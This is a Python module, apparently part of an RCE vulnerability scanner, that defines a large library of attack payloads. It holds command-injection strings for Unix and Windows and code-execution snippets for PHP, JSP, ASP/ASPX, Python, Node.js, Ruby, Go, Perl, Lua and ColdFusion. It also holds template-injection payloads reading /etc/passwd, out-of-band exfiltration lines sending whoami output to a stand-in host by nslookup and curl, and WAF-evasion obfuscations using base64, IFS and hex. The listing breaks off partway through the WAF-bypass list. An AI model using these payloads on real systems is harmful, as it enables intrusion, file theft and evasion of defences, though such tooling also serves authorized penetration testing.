"""
Payload生成器模块
支持多种编程环境的RCE Payload生成
"""

import base64
import urllib.parse
import random
import string
from typing import List, Dict, Optional, Set
from dataclasses import dataclass
from enum import Enum


class PayloadType(Enum):
    TIME_BASED = "time_based"
    ECHO_BASED = "echo_based"
    DNS_BASED = "dns_based"
    FILE_BASED = "file_based"
    CODE_EXEC = "code_exec"


class OSType(Enum):
    UNIX = "unix"
    WINDOWS = "windows"
    BOTH = "both"


class ScanMode(Enum):
    HARMLESS = "harmless"
    ECHO = "echo"
    WAF_BYPASS = "waf_bypass"


class TechType(Enum):
    PHP = "php"
    JSP_JAVA = "jsp_java"
    ASP = "asp"
    ASPX_DOTNET = "aspx_dotnet"
    PYTHON = "python"
    NODEJS = "nodejs"
    RUBY = "ruby"
    GO = "go"
    PERL = "perl"
    LUA = "lua"
    COLDFUSION = "coldfusion"
    CGI = "cgi"
    TEMPLATE = "template"
    EXPRESSION = "expression"


@dataclass
class Payload:
    content: str
    payload_type: PayloadType
    os_type: OSType
    description: str
    tech_type: Optional[TechType] = None
    expected_delay: Optional[float] = None
    expected_output: Optional[str] = None
    encoded: bool = False
    is_harmless: bool = True


class PayloadGenerator:
    """Payload生成器 - 支持多种编程环境"""
    
    TECH_EXTENSIONS = {
        TechType.PHP: ['.php', '.php3', '.php4', '.php5', '.phtml', '.phps'],
        TechType.JSP_JAVA: ['.jsp', '.jspx', '.jspa', '.jsw', '.jsv', '.do', '.action'],
        TechType.ASP: ['.asp'],
        TechType.ASPX_DOTNET: ['.aspx', '.ashx', '.asmx', '.asax', '.svc', '.axd'],
        TechType.PYTHON: ['.py', '.wsgi', '.cgi', '.fcgi'],
        TechType.NODEJS: ['.js', '.mjs', '.cjs', '.node'],
        TechType.RUBY: ['.rb', '.erb', '.rhtml', '.rjs', '.rake'],
        TechType.GO: ['.go'],
        TechType.PERL: ['.pl', '.pm', '.cgi', '.t'],
        TechType.LUA: ['.lua', '.wlua'],
        TechType.COLDFUSION: ['.cfm', '.cfml', '.cfc'],
        TechType.CGI: ['.cgi', '.fcgi'],
    }
    
    def __init__(self):
        self.payloads: List[Payload] = []
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """加载默认payload库 - 所有Payload集中定义"""
        self._load_time_based_payloads()
        self._load_echo_test_payloads()
        self._load_dns_payloads()
        self._load_file_payloads()
        self._load_os_echo_payloads()
        self._load_php_payloads()
        self._load_jsp_payloads()
        self._load_asp_payloads()
        self._load_aspx_payloads()
        self._load_python_payloads()
        self._load_nodejs_payloads()
        self._load_ruby_payloads()
        self._load_go_payloads()
        self._load_perl_payloads()
        self._load_lua_payloads()
        self._load_coldfusion_payloads()
        self._load_template_payloads()
        self._load_waf_bypass_payloads()
        
        self.payloads.extend(self.unix_time_payloads)
        self.payloads.extend(self.windows_time_payloads)
        self.payloads.extend(self.echo_test_payloads)
        self.payloads.extend(self.dns_payloads)
        self.payloads.extend(self.file_payloads)
    
    def _load_time_based_payloads(self):
        """加载时间盲注Payload"""
        self.unix_time_payloads = [
            Payload("; sleep 5;", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 分号分隔", expected_delay=5),
            Payload("| sleep 5 |", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 管道符", expected_delay=5),
            Payload("&& sleep 5 &&", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - AND连接", expected_delay=5),
            Payload("|| sleep 5 ||", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - OR连接", expected_delay=5),
            Payload("`sleep 5`", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 反引号执行", expected_delay=5),
            Payload("$(sleep 5)", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - $()执行", expected_delay=5),
            Payload("\n sleep 5", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 换行符", expected_delay=5),
        ]
        
        self.windows_time_payloads = [
            Payload("& timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - &连接", expected_delay=5),
            Payload("| timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - 管道符", expected_delay=5),
            Payload("&& timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - AND连接", expected_delay=5),
            Payload("|| ping -n 5 127.0.0.1", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - ping延迟", expected_delay=5),
        ]
    
    def _load_echo_test_payloads(self):
        """加载回显测试Payload"""
        self.echo_test_payloads = [
            Payload("; echo 'RCE_TEST_MARKER_12345';", PayloadType.ECHO_BASED, OSType.UNIX, "Unix回显测试", expected_output="RCE_TEST_MARKER_12345"),
            Payload("| echo RCE_TEST_MARKER_12345 |", PayloadType.ECHO_BASED, OSType.UNIX, "Unix回显测试 - 管道符", expected_output="RCE_TEST_MARKER_12345"),
            Payload("& echo RCE_TEST_MARKER_12345", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows回显测试", expected_output="RCE_TEST_MARKER_12345"),
            Payload("| echo RCE_TEST_MARKER_12345", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows回显测试 - 管道符", expected_output="RCE_TEST_MARKER_12345"),
        ]
    
    def _load_dns_payloads(self):
        """加载DNS外带Payload"""
        self.dns_payloads = [
            Payload("; nslookup $(whoami).dns.example.com;", PayloadType.DNS_BASED, OSType.UNIX, "Unix DNS外带测试"),
            Payload("| nslookup %USERNAME%.dns.example.com", PayloadType.DNS_BASED, OSType.WINDOWS, "Windows DNS外带测试"),
            Payload("; curl http://dns.example.com/$(whoami);", PayloadType.DNS_BASED, OSType.UNIX, "Unix HTTP外带测试"),
        ]
    
    def _load_file_payloads(self):
        """加载文件写入Payload"""
        self.file_payloads = [
            Payload("; id > /tmp/rce_test.txt;", PayloadType.FILE_BASED, OSType.UNIX, "Unix文件写入测试"),
            Payload("& whoami > C:\\temp\\rce_test.txt", PayloadType.FILE_BASED, OSType.WINDOWS, "Windows文件写入测试"),
        ]
    
    def _load_os_echo_payloads(self):
        """加载操作系统回显Payload"""
        self.unix_echo_payloads = [
            Payload("; ls;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 列出当前目录", expected_output="", is_harmless=False),
            Payload("; ls -la;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 列出详细信息", expected_output="total", is_harmless=False),
            Payload("; whoami;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示当前用户", expected_output="", is_harmless=False),
            Payload("; id;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示用户ID", expected_output="uid=", is_harmless=False),
            Payload("; pwd;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示当前路径", expected_output="/", is_harmless=False),
            Payload("; uname -a;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 系统信息", expected_output="Linux", is_harmless=False),
            Payload("; cat /etc/passwd;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 读取passwd", expected_output="root:", is_harmless=False),
            Payload("| ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 管道符ls", expected_output="", is_harmless=False),
            Payload("| whoami", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 管道符whoami", expected_output="", is_harmless=False),
            Payload("&& ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - AND连接ls", expected_output="", is_harmless=False),
            Payload("|| ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - OR连接ls", expected_output="", is_harmless=False),
            Payload("`ls`", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 反引号ls", expected_output="", is_harmless=False),
            Payload("$(ls)", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - $()执行ls", expected_output="", is_harmless=False),
        ]
        
        self.windows_echo_payloads = [
            Payload("& dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 列出目录", expected_output="", is_harmless=False),
            Payload("& whoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 当前用户", expected_output="", is_harmless=False),
            Payload("& type %COMSPEC%", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 读取文件", expected_output="", is_harmless=False),
            Payload("| dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 管道符dir", expected_output="", is_harmless=False),
            Payload("| whoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 管道符whoami", expected_output="", is_harmless=False),
            Payload("&& dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - AND连接dir", expected_output="", is_harmless=False),
        ]
    
    def _load_php_payloads(self):
        """加载PHP代码执行Payload"""
        self.php_code_exec_payloads = [
            Payload("system('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("system('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - whoami", TechType.PHP, expected_output="", is_harmless=False),
            Payload("system('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - id", TechType.PHP, expected_output="uid=", is_harmless=False),
            Payload("exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP exec()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("exec('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP exec() - whoami", TechType.PHP, expected_output="", is_harmless=False),
            Payload("shell_exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP shell_exec()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("shell_exec('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP shell_exec() - whoami", TechType.PHP, expected_output="", is_harmless=False),
            Payload("passthru('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("passthru('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru() - whoami", TechType.PHP, expected_output="", is_harmless=False),
            Payload("passthru('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru() - id", TechType.PHP, expected_output="uid=", is_harmless=False),
            Payload("`ls`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号执行", TechType.PHP, expected_output="", is_harmless=False),
            Payload("`whoami`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号 - whoami", TechType.PHP, expected_output="", is_harmless=False),
            Payload("popen('ls','r');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP popen()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("proc_open('ls',[],$pipes);", PayloadType.CODE_EXEC, OSType.BOTH, "PHP proc_open()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("pcntl_exec('/bin/sh',['-c','ls']);", PayloadType.CODE_EXEC, OSType.BOTH, "PHP pcntl_exec()函数", TechType.PHP, expected_output="", is_harmless=False),
            Payload("assert('system(\"ls\")');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP assert()执行", TechType.PHP, expected_output="", is_harmless=False),
            Payload("preg_replace('/.*/e','system(\"ls\")','');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP preg_replace /e修饰符", TechType.PHP, expected_output="", is_harmless=False),
            Payload("create_function('','system(\"ls\");');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP create_function()", TechType.PHP, expected_output="", is_harmless=False),
            Payload("array_map('system',array('ls'));", PayloadType.CODE_EXEC, OSType.BOTH, "PHP array_map()", TechType.PHP, expected_output="", is_harmless=False),
            Payload("call_user_func('system','ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP call_user_func()", TechType.PHP, expected_output="", is_harmless=False),
        ]
    
    def _load_jsp_payloads(self):
        """加载JSP/Java代码执行Payload"""
        self.jsp_code_exec_payloads = [
            Payload("<%Runtime.getRuntime().exec(\"ls\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec()", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"whoami\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - whoami", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"id\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - id", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%=Runtime.getRuntime().exec(\"ls\")%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP表达式执行", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%new java.lang.ProcessBuilder(\"ls\").start();%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP ProcessBuilder", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%new java.lang.ProcessBuilder(\"whoami\").start();%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP ProcessBuilder - whoami", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("#{Runtime.getRuntime().exec('ls')}", PayloadType.CODE_EXEC, OSType.BOTH, "EL表达式执行", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("#{Runtime.getRuntime().exec('whoami')}", PayloadType.CODE_EXEC, OSType.BOTH, "EL表达式 - whoami", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("${Runtime.getRuntime().exec('ls')}", PayloadType.CODE_EXEC, OSType.BOTH, "Spring EL表达式", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<%@ page import=\"java.util.*\"%><%Runtime.getRuntime().exec(\"ls\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP带import执行", TechType.JSP_JAVA, expected_output="", is_harmless=False),
            Payload("<jsp:scriptlet>Runtime.getRuntime().exec(\"ls\");</jsp:scriptlet>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP XML格式执行", TechType.JSP_JAVA, expected_output="", is_harmless=False),
        ]
    
    def _load_asp_payloads(self):
        """加载ASP代码执行Payload"""
        self.asp_code_exec_payloads = [
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell", TechType.ASP, expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c whoami\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell - whoami", TechType.ASP, expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%Response.Write(shell.Exec(\"cmd /c dir\").StdOut.ReadAll)%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP Exec读取输出", TechType.ASP, expected_output="", is_harmless=False),
            Payload("<%Set fso=Server.CreateObject(\"Scripting.FileSystemObject\")%><%Set f=fso.CreateTextFile(\"test.txt\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP FileSystemObject", TechType.ASP, expected_output="", is_harmless=False),
        ]
    
    def _load_aspx_payloads(self):
        """加载ASPX代码执行Payload"""
        self.aspx_code_exec_payloads = [
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start - whoami", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "ASPX Process.Start - id", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
            Payload("<%=System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX表达式执行", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
            Payload("<%@ Import Namespace=\"System.Diagnostics\" %><%Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX带Import执行", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
            Payload("<%new System.Diagnostics.Process(){StartInfo=new ProcessStartInfo(\"cmd.exe\",\"/c dir\")}.Start();%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process初始化执行", TechType.ASPX_DOTNET, expected_output="", is_harmless=False),
        ]
    
    def _load_python_payloads(self):
        """加载Python代码执行Payload"""
        self.python_code_exec_payloads = [
            Payload("__import__('os').system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ os.system", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("__import__('os').system('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ - whoami", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("__import__('os').popen('ls').read()", PayloadType.CODE_EXEC, OSType.BOTH, "Python os.popen", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("__import__('subprocess').check_output('ls',shell=True)", PayloadType.CODE_EXEC, OSType.BOTH, "Python subprocess", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("eval('__import__(\"os\").system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Python eval执行", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("exec('__import__(\"os\").system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Python exec执行", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("compile('__import__(\"os\").system(\"ls\")','','exec')", PayloadType.CODE_EXEC, OSType.BOTH, "Python compile执行", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("open('/etc/passwd').read()", PayloadType.CODE_EXEC, OSType.UNIX, "Python文件读取", TechType.PYTHON, expected_output="root:", is_harmless=False),
            Payload("import os;os.system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Python import执行", TechType.PYTHON, expected_output="", is_harmless=False),
            Payload("breakpoint().__import__('os').system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Python breakpoint执行", TechType.PYTHON, expected_output="", is_harmless=False),
        ]
    
    def _load_nodejs_payloads(self):
        """加载Node.js代码执行Payload"""
        self.nodejs_code_exec_payloads = [
            Payload("require('child_process').exec('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js require exec", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("require('child_process').exec('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js require exec - whoami", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("require('child_process').execSync('ls').toString()", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js execSync", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("require('child_process').spawn('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js spawn", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("require('child_process').execSync('id').toString()", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js execSync - id", TechType.NODEJS, expected_output="uid=", is_harmless=False),
            Payload("process.binding('spawn_sync').spawn({file:'ls',args:['ls']})", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js process.binding", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("global.process.mainModule.require('child_process').exec('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js mainModule require", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("this.constructor.constructor('return process')().mainModule.require('child_process').exec('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js constructor chain", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("eval('require(\"child_process\").execSync(\"ls\").toString()')", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js eval执行", TechType.NODEJS, expected_output="", is_harmless=False),
            Payload("Function('return require(\"child_process\").execSync(\"ls\")')()", PayloadType.CODE_EXEC, OSType.BOTH, "Node.js Function构造", TechType.NODEJS, expected_output="", is_harmless=False),
        ]
    
    def _load_ruby_payloads(self):
        """加载Ruby代码执行Payload"""
        self.ruby_code_exec_payloads = [
            Payload("system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby system", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("system('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby system - whoami", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("`ls`", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby反引号执行", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("`whoami`", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby反引号 - whoami", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("exec('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby exec", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("IO.popen('ls').read()", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby IO.popen", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("Open3.popen3('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby Open3.popen3", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("%x{ls}", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby %x执行", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("eval('system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby eval执行", TechType.RUBY, expected_output="", is_harmless=False),
            Payload("Process.spawn('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Ruby Process.spawn", TechType.RUBY, expected_output="", is_harmless=False),
        ]
    
    def _load_go_payloads(self):
        """加载Go代码执行Payload"""
        self.go_code_exec_payloads = [
            Payload("exec.Command(\"ls\").Run()", PayloadType.CODE_EXEC, OSType.BOTH, "Go exec.Command", TechType.GO, expected_output="", is_harmless=False),
            Payload("exec.Command(\"whoami\").Run()", PayloadType.CODE_EXEC, OSType.BOTH, "Go exec.Command - whoami", TechType.GO, expected_output="", is_harmless=False),
            Payload("exec.Command(\"sh\",\"-c\",\"ls\").Run()", PayloadType.CODE_EXEC, OSType.BOTH, "Go exec.Command shell", TechType.GO, expected_output="", is_harmless=False),
            Payload("syscall.Exec(\"/bin/ls\",[]string{\"ls\"},nil)", PayloadType.CODE_EXEC, OSType.UNIX, "Go syscall.Exec", TechType.GO, expected_output="", is_harmless=False),
            Payload("exec.Command(\"cmd\",\"/c\",\"dir\").Run()", PayloadType.CODE_EXEC, OSType.WINDOWS, "Go Windows exec", TechType.GO, expected_output="", is_harmless=False),
        ]
    
    def _load_perl_payloads(self):
        """加载Perl代码执行Payload"""
        self.perl_code_exec_payloads = [
            Payload("system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Perl system", TechType.PERL, expected_output="", is_harmless=False),
            Payload("system('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Perl system - whoami", TechType.PERL, expected_output="", is_harmless=False),
            Payload("exec('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Perl exec", TechType.PERL, expected_output="", is_harmless=False),
            Payload("`ls`", PayloadType.CODE_EXEC, OSType.BOTH, "Perl反引号执行", TechType.PERL, expected_output="", is_harmless=False),
            Payload("qx{ls}", PayloadType.CODE_EXEC, OSType.BOTH, "Perl qx执行", TechType.PERL, expected_output="", is_harmless=False),
            Payload("open(F,'ls|')", PayloadType.CODE_EXEC, OSType.BOTH, "Perl open管道", TechType.PERL, expected_output="", is_harmless=False),
            Payload("eval('system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Perl eval执行", TechType.PERL, expected_output="", is_harmless=False),
            Payload("do 'ls'", PayloadType.CODE_EXEC, OSType.BOTH, "Perl do执行", TechType.PERL, expected_output="", is_harmless=False),
        ]
    
    def _load_lua_payloads(self):
        """加载Lua代码执行Payload"""
        self.lua_code_exec_payloads = [
            Payload("os.execute('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Lua os.execute", TechType.LUA, expected_output="", is_harmless=False),
            Payload("os.execute('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Lua os.execute - whoami", TechType.LUA, expected_output="", is_harmless=False),
            Payload("io.popen('ls'):read('*a')", PayloadType.CODE_EXEC, OSType.BOTH, "Lua io.popen", TechType.LUA, expected_output="", is_harmless=False),
            Payload("io.popen('whoami'):read('*a')", PayloadType.CODE_EXEC, OSType.BOTH, "Lua io.popen - whoami", TechType.LUA, expected_output="", is_harmless=False),
            Payload("load(os.execute('ls'))", PayloadType.CODE_EXEC, OSType.BOTH, "Lua load执行", TechType.LUA, expected_output="", is_harmless=False),
        ]
    
    def _load_coldfusion_payloads(self):
        """加载ColdFusion代码执行Payload"""
        self.coldfusion_code_exec_payloads = [
            Payload("<cfexecute name=\"ls\">", PayloadType.CODE_EXEC, OSType.BOTH, "CF cfexecute", TechType.COLDFUSION, expected_output="", is_harmless=False),
            Payload("<cfexecute name=\"cmd\" arguments=\"/c dir\">", PayloadType.CODE_EXEC, OSType.WINDOWS, "CF cfexecute Windows", TechType.COLDFUSION, expected_output="", is_harmless=False),
            Payload("<cfscript>executeCommand('ls')</cfscript>", PayloadType.CODE_EXEC, OSType.BOTH, "CF cfscript execute", TechType.COLDFUSION, expected_output="", is_harmless=False),
            Payload("<cfobject type=\"COM\" class=\"WScript.Shell\">", PayloadType.CODE_EXEC, OSType.WINDOWS, "CF COM对象", TechType.COLDFUSION, expected_output="", is_harmless=False),
        ]
    
    def _load_template_payloads(self):
        """加载模板注入Payload"""
        self.template_payloads = [
            Payload("{{7*7}}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI测试 - Jinja2/Twig", TechType.TEMPLATE, expected_output="49", is_harmless=False),
            Payload("${7*7}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI测试 - FreeMarker", TechType.TEMPLATE, expected_output="49", is_harmless=False),
            Payload("#{7*7}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI测试 - Ruby ERB", TechType.TEMPLATE, expected_output="49", is_harmless=False),
            Payload("{{config}}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - Flask config", TechType.TEMPLATE, expected_output="", is_harmless=False),
            Payload("{{self.__class__.__mro__[1].__subclasses__()}}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - Python subclasses", TechType.TEMPLATE, expected_output="", is_harmless=False),
            Payload("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", PayloadType.CODE_EXEC, OSType.UNIX, "SSTI - 文件读取", TechType.TEMPLATE, expected_output="root:", is_harmless=False),
            Payload("${\"freemarker.template.utility.Execute\"?new()(\"ls\")}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - FreeMarker执行", TechType.TEMPLATE, expected_output="", is_harmless=False),
            Payload("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"ls\")}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - FreeMarker assign", TechType.TEMPLATE, expected_output="", is_harmless=False),
            Payload("{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - Jinja2 os.popen", TechType.TEMPLATE, expected_output="", is_harmless=False),
            Payload("${T(java.lang.Runtime).getRuntime().exec('ls')}", PayloadType.CODE_EXEC, OSType.BOTH, "SSTI - Spring Thymeleaf", TechType.TEMPLATE, expected_output="", is_harmless=False),
        ]
    
    def _load_waf_bypass_payloads(self):
        """加载WAF绕过Payload - 增强版"""
        self.unix_waf_bypass_payloads = [
            Payload("; l''s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 引号分割", expected_output="", is_harmless=False),
            Payload("; l\\s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 反斜杠", expected_output="", is_harmless=False),
            Payload("; l$@s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 特殊字符", expected_output="", is_harmless=False),
            Payload("; l$()s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 空命令替换", expected_output="", is_harmless=False),
            Payload("; {ls,};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 大括号扩展", expected_output="", is_harmless=False),
            Payload("; l${PATH:0:0}s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 变量切片", expected_output="", is_harmless=False),
            Payload("; l${IFS}s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS变量", expected_output="", is_harmless=False),
            Payload(";$(printf'\\x6c\\x73');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - printf十六进制", expected_output="", is_harmless=False),
            Payload(";$(echo'bHM='|base64-d);", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - base64解码", expected_output="", is_harmless=False),
            Payload("; w${PATH:0:0}hoami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami变量切片", expected_output="", is_harmless=False),
            Payload("; {whoami,};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami大括号", expected_output="", is_harmless=False),
            Payload("; wh\\oami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami反斜杠", expected_output="", is_harmless=False),
            Payload("; wh''oami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami引号", expected_output="", is_harmless=False),
            Payload("%0als", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 换行符URL编码", expected_output="", is_harmless=False),
            Payload("%0awhoami", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami换行编码", expected_output="", is_harmless=False),
            Payload(";${IFS}ls${IFS}-la;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS空格替换", expected_output="total", is_harmless=False),
